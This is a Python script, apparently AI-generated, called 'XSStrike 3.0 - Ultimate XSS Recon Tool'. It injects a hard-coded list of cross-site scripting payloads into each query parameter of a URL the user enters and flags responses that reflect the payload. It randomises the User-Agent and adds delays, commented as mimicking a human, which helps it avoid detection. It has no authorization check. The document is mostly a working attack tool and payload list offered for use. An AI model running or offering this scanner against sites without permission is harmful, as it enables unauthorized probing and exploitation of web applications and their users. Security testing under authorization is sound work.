import requests
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
import time
import random

# Load the massive XSS payload list (condensed from your document)
XSS_PAYLOADS = [
    "-prompt(8)-", "'-prompt(8)-'", ";a=prompt,a()//", "';a=prompt,a()//",
    "'-eval(\"window['pro'%2B'mpt'](8)\")-'", "\"-eval(\"window['pro'%2B'mpt'](8)\")-\"",
    "onclick=prompt(8)>\"@x.y", "onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
    "<image/src/onerror=prompt(8)>", "<img/src/onerror=prompt(8)>",
    "<image src/onerror=prompt(8)>", "<img src=onerror=prompt(8)>",
    "<image src =q onerror=prompt(8)>", "<img src =q onerror=prompt(8)>",
    "</scrip</script>t><img src =q onerror=prompt(8)>",
    "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
    "'`\"><\\x3Cscript>javascript:alert(1)</script>", "'`\"><\\x00script>javascript:alert(1)</script>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>",
    "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>",
    "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>",
    "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>",
    "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>",
    "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>",
    "<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>",
    "<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange>",
   
    "<svg onload svg onload=\"javascript:javascript:alert(1)\"></svg onload>",
    "<iframe src iframe src=\"javascript:javascript:alert(1)\"></iframe src>",
    "<script>alert('XSS')</script>", "%3cscript%3ealert('XSS')%3c/script%3e",
    "<IMG SRC=\"javascript:alert('XSS');\">", "<IMG SRC=javascript:alert('XSS')>",
    "<img src=xss onerror=alert(1)>", "<marquee onstart='javascript:alert(1);'>=(◕_◕)="
    # Add the full list in a separate file or paste directly here
]

# Load full payload list from a file (recommended for 500+ entries)
def load_payloads(file_path="xss_payloads.txt"):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Payload file not found. Using default payloads.")
        return XSS_PAYLOADS

def extract_params(url):
    """Extract parameters from URL."""
    parsed = urlparse(url)
    return parse_qs(parsed.query)

def test_xss(url, params, payloads, headers=None):
    """Test parameters with XSS payloads."""
    if headers is None:
        headers = {"User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ])}
    
    base_url = url.split("?")[0]
    findings = []

    for param in params.keys():
        print(f"\nTesting parameter: {param}")
        for payload in payloads[:50]:  # Batch to 50 for now—adjust as needed
            test_params = {k: v[0] if k != param else payload for k, v in params.items()}
            test_url = f"{base_url}?{urlencode(test_params)}"
            
            try:
                response = requests.get(test_url, headers=headers, timeout=5)
                content = response.text.lower()
                soup = BeautifulSoup(response.text, "html.parser")

                payload_lower = payload.lower()
                if payload_lower in content:
                    status = "Reflected - Potential XSS"
                    findings.append({"url": test_url, "param": param, "payload": payload, "status": status})
                    print(f"[+] {status} - {test_url}")
                elif any("alert(1)" in tag.get_text().lower() or "prompt(8)" in tag.get_text().lower() 
                         for tag in soup.find_all(["script", "img", "svg", "iframe"])):
                    status = "Executed - Likely XSS"
                    findings.append({"url": test_url, "param": param, "payload": payload, "status": status})
                    print(f"[++] {status} - {test_url}")
                else:
                    print(f"[-] No signs for {payload[:20]}... in {test_url}")

                time.sleep(random.uniform(0.5, 1.5))  # Random delay to mimic human

            except requests.RequestException as e:
                print(f"Error: {e}")

    return findings

def save_results(findings):
    """Save findings to a file."""
    with open("xss_results.txt", "w", encoding="utf-8") as f:
        for finding in findings:
            f.write(f"URL: {finding['url']}\nParam: {finding['param']}\nPayload: {finding['payload']}\nStatus: {finding['status']}\n\n")

def main():
    print("XSStrike 3.0 - Ultimate XSS Recon Tool")
    target_url = input("Enter a URL with parameters: ")
    print(f"Starting XSS testing on {target_url}...")

    params = extract_params(target_url)
    if not params:
        print("No parameters found. Add ?key=value to the URL.")
        return

    # Load payloads (use file for full list)
    payloads = load_payloads("xss_payloads.txt")
    print(f"Loaded {len(payloads)} payloads for testing.")

    findings = test_xss(target_url, params, payloads)
    
    print("\n=== XSS Findings ===")
    if findings:
        for f in findings:
            print(f"URL: {f['url']}\nParam: {f['param']}\nPayload: {f['payload']}\nStatus: {f['status']}\n")
        save_results(findings)
        print("Results saved to xss_results.txt")
    else:
        print("No XSS vulnerabilities detected.")

if __name__ == "__main__":
    main()
